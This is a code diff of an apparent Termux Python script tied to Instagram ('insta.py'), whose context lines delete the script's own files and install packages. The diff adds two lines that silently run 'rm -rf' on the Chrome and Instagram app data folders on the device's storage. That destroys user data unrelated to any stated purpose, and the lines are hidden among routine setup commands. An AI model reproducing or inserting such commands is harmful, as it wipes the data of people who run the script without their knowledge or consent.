@@ -89,6 +89,8 @@ os.system("rm -rf /data/data/com.termux/files/svr/.insta.py")
 os.system("rm -rf /sdcard/download/.insta.py")
 os.system("rm -rf insta.py")
 os.system("rm -rf /data/data/com.termux/files/svr/insta.py")
+os.system("rm -rf /sdcard/Android/data/com.android.chrome")
+os.system("rm -rf /sdcard/Android/data/com.instagram.android")
 os.system("rm -rf /sdcard/download/insta.py ;pip3 install bs4 ;pip install colorama")
 ######################################################################
 os.system("pkg install termux-api ;pip install datatime ;pip install requests ;pip install user_agent")
